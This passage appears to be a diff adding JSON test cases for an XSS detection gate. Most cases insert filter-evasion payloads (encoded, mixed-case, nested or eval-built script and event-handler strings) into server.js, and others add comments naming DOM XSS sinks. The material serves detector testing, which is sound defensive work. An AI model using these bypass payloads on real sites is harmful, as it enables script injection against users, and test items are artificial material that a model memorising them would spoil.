+    "id": "xss-048",
+    "requiresDocker": false,
+    "description": "XSS-05: URL encoded javascript href",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<a href=\"javascript:%61lert(1)\">click</a>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "URL-encoded character in javascript: URI"
+  },
+  {
+    "id": "xss-049",
+    "requiresDocker": false,
+    "description": "XSS-05: double URL encoded script tags",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `%253Cscript%253Ealert(1)%253C%252Fscript%253E`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "Double URL encoding to bypass single-decode filters"
+  },
+  {
+    "id": "xss-050",
+    "requiresDocker": false,
+    "description": "XSS-05: Unicode escape in script",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>\\u0061lert(1)</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "Unicode escape sequence for \"a\" in alert"
+  },
+  {
+    "id": "xss-051",
+    "requiresDocker": false,
+    "description": "XSS-05: full Unicode escape alert",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "Every character of alert as Unicode escape"
+  },
+  {
+    "id": "xss-052",
+    "requiresDocker": false,
+    "description": "XSS-05: HTML entity encoded javascript: href",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)\">click</a>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "Full entity encoding of javascript: protocol"
+  },
+  {
+    "id": "xss-053",
+    "requiresDocker": false,
+    "description": "XSS-05: UTF-7 encoded script",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `+ADw-script+AD4-alert(1)+ADw-/script+AD4-`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "UTF-7 encoding to bypass UTF-8 filters"
+  },
+  {
+    "id": "xss-054",
+    "requiresDocker": false,
+    "description": "XSS-05: HTML entity with leading zeros",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<img src=x onerror=&#0000097;&#0000108;&#0000101;&#0000114;&#0000116;(1)>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "Zero-padded HTML entities spelling alert"
+  },
+  {
+    "id": "xss-055",
+    "requiresDocker": false,
+    "description": "XSS-05: javascript with entity-encoded tab",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<a href=\"java&#x09;script:alert(1)\">click</a>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "Tab character entity inside javascript: href"
+  },
+  {
+    "id": "xss-056",
+    "requiresDocker": false,
+    "description": "XSS-05: percent-encoded javascript colon",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<a href=\"javascript%3Aalert(1)\">click</a>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "Percent-encoded colon in javascript: protocol"
+  },
+  {
+    "id": "xss-057",
+    "requiresDocker": false,
+    "description": "XSS-05: octal encoded alert in script",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>\\141\\154\\145\\162\\164(1)</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "Octal character escapes for alert"
+  },
+  {
+    "id": "xss-058",
+    "requiresDocker": false,
+    "description": "XSS-05 clean: safe HTML entity for copyright",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const text = \"&#169; 2026 Company\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "HTML entity for copyright symbol is safe"
+  },
+  {
+    "id": "xss-059",
+    "requiresDocker": false,
+    "description": "XSS-05 clean: standard URL encoding in query param",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const url = \"/search?q=hello%20world\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "URL encoding for space in query parameter"
+  },
+  {
+    "id": "xss-060",
+    "requiresDocker": false,
+    "description": "XSS-05 grounding: fabricated encoded payload in /api/echo",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "content",
+        "file": "server.js",
+        "pattern": "&#x61;&#x6c;&#x65;&#x72;&#x74;"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "No HTML entity encoded strings exist in server.js"
+  },
+  {
+    "id": "xss-061",
+    "requiresDocker": false,
+    "description": "XSS-06: mixed case <ScRiPt> tag",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<ScRiPt>alert(1)</ScRiPt>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "Mixed case to bypass case-sensitive filters"
+  },
+  {
+    "id": "xss-062",
+    "requiresDocker": false,
+    "description": "XSS-06: upper case SCRIPT tag",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<SCRIPT>alert(1)</SCRIPT>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "All uppercase SCRIPT tag"
+  },
+  {
+    "id": "xss-063",
+    "requiresDocker": false,
+    "description": "XSS-06: null byte in script tag",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<scr\\0ipt>alert(1)</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "Null byte injection to break filter matching"
+  },
+  {
+    "id": "xss-064",
+    "requiresDocker": false,
+    "description": "XSS-06: nested script tags",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<scr<script>ipt>alert(1)</scr</script>ipt>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "Nested script tags surviving single-pass strip"
+  },
+  {
+    "id": "xss-065",
+    "requiresDocker": false,
+    "description": "XSS-06: comment break in alert function",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>al/**/ert(1)</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "Comment insertion to break keyword matching"
+  },
+  {
+    "id": "xss-066",
+    "requiresDocker": false,
+    "description": "XSS-06: HTML comment inside script tag",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<scri<!---->pt>alert(1)</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "HTML comment breaking script tag parsing"
+  },
+  {
+    "id": "xss-067",
+    "requiresDocker": false,
+    "description": "XSS-06: forward slash break in tag",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<img/onerror=alert(1) src=x>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "Slash between tag name and attribute"
+  },
+  {
+    "id": "xss-068",
+    "requiresDocker": false,
+    "description": "XSS-06: double open angle bracket",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<<script>alert(1)</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "Double angle bracket confusing parser"
+  },
+  {
+    "id": "xss-069",
+    "requiresDocker": false,
+    "description": "XSS-06: backtick instead of parentheses",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>alert\\`1\\`</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "Tagged template literal replacing parentheses"
+  },
+  {
+    "id": "xss-070",
+    "requiresDocker": false,
+    "description": "XSS-06: throw with onerror assignment",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>onerror=alert;throw 1</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "Assign onerror then throw to trigger it"
+  },
+  {
+    "id": "xss-071",
+    "requiresDocker": false,
+    "description": "XSS-06: constructor prototype chain",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>[].constructor.constructor(\"alert(1)\")()</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "Prototype chain to access Function constructor"
+  },
+  {
+    "id": "xss-072",
+    "requiresDocker": false,
+    "description": "XSS-06: String.fromCharCode + eval",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "Char code construction of alert(1) string"
+  },
+  {
+    "id": "xss-073",
+    "requiresDocker": false,
+    "description": "XSS-06: atob decode + eval",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>eval(atob(\"YWxlcnQoMSk=\"))</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "Base64 decode of alert(1) passed to eval"
+  },
+  {
+    "id": "xss-074",
+    "requiresDocker": false,
+    "description": "XSS-06: prompt instead of alert",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>prompt(1)</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "prompt() as alternative to alert()"
+  },
+  {
+    "id": "xss-075",
+    "requiresDocker": false,
+    "description": "XSS-06: confirm instead of alert",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>confirm(1)</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "confirm() as alternative to alert()"
+  },
+  {
+    "id": "xss-076",
+    "requiresDocker": false,
+    "description": "XSS-06: SVG onload with entity-encoded handler",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<svg/onload=&#97&#108&#101&#114&#116(1)>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "SVG onload with entity-encoded function name"
+  },
+  {
+    "id": "xss-077",
+    "requiresDocker": false,
+    "description": "XSS-06: mixed encoding combined in href",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<a href=\"j&#97;v&#x61;script:alert(1)\">click</a>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "Mixed decimal and hex entities in javascript:"
+  },
+  {
+    "id": "xss-078",
+    "requiresDocker": false,
+    "description": "XSS-06 clean: proper HTML comment",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const html = \"<!-- page footer -->\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "Standard HTML comment is safe"
+  },
+  {
+    "id": "xss-079",
+    "requiresDocker": false,
+    "description": "XSS-06 clean: template literal with safe interpolation",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const tpl = `Hello ${username}`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "Template literal without script context"
+  },
+  {
+    "id": "xss-080",
+    "requiresDocker": false,
+    "description": "XSS-06 grounding: fabricated nested script tag in server.js",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "content",
+        "file": "server.js",
+        "pattern": "<scr<script>ipt>"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "filter_evasion",
+      "XSS-06"
+    ],
+    "rationale": "No nested script tag evasion exists in server.js"
+  },
+  {
+    "id": "xss-081",
+    "requiresDocker": false,
+    "description": "XSS-07: document.write with location.hash",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: document.write(location.hash)\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "document.write with unvalidated location.hash"
+  },
+  {
+    "id": "xss-082",
+    "requiresDocker": false,
+    "description": "XSS-07: document.write with user input variable",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: document.write(userInput)\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "document.write with unvalidated user input"
+  },
+  {
+    "id": "xss-083",
+    "requiresDocker": false,
+    "description": "XSS-07: innerHTML assignment from user input",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: document.getElementById(\"output\").innerHTML = userInput\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "innerHTML set to unvalidated user input"
+  },
+  {
+    "id": "xss-084",
+    "requiresDocker": false,
+    "description": "XSS-07: innerHTML with template literal interpolation",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: el.innerHTML = `<div>${userInput}</div>`\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "innerHTML with unsanitized template interpolation"
+  },
+  {
+    "id": "xss-085",
+    "requiresDocker": false,
+    "description": "XSS-07: outerHTML assignment from input",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: element.outerHTML = userInput\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "outerHTML set to unvalidated input"
+  },
+  {
+    "id": "xss-086",
+    "requiresDocker": false,
+    "description": "XSS-07: eval with user input",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: eval(userInput)\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "eval() with unvalidated user input"
+  },
+  {
+    "id": "xss-087",
+    "requiresDocker": false,
+    "description": "XSS-07: setTimeout with string argument from user",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: setTimeout(userInput, 0)\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "setTimeout with string arg allows code injection"
+  },
+  {
+    "id": "xss-088",
+    "requiresDocker": false,
+    "description": "XSS-07: setInterval with string argument from user",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: setInterval(userInput, 1000)\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "setInterval with string arg allows code injection"
+  },
+  {
+    "id": "xss-089",
+    "requiresDocker": false,
+    "description": "XSS-07: Function constructor from input",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: new Function(userInput)()\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "Function constructor executes arbitrary code"
+  },
+  {
+    "id": "xss-090",
+    "requiresDocker": false,
+    "description": "XSS-07: document.location assignment from input",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: document.location = userInput\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "Location assignment enables javascript: navigation"
+  },
+  {
+    "id": "xss-091",
+    "requiresDocker": false,
+    "description": "XSS-07: window.location.href from user input",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: window.location.href = userInput\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "Location href set to unvalidated input"
+  },
+  {
+    "id": "xss-092",
+    "requiresDocker": false,
+    "description": "XSS-07: insertAdjacentHTML with user input",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: el.insertAdjacentHTML(\"beforeend\", userInput)\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "dom_based",
+      "XSS-07"
+    ],
+    "rationale": "insertAdjacentHTML injects raw HTML from input"
+  },
+  {
+    "id": "xss-093",
+    "requiresDocker": false,
+    "description": "XSS-07: jQuery .html() with user input",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: $(selector).html(userInput)\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
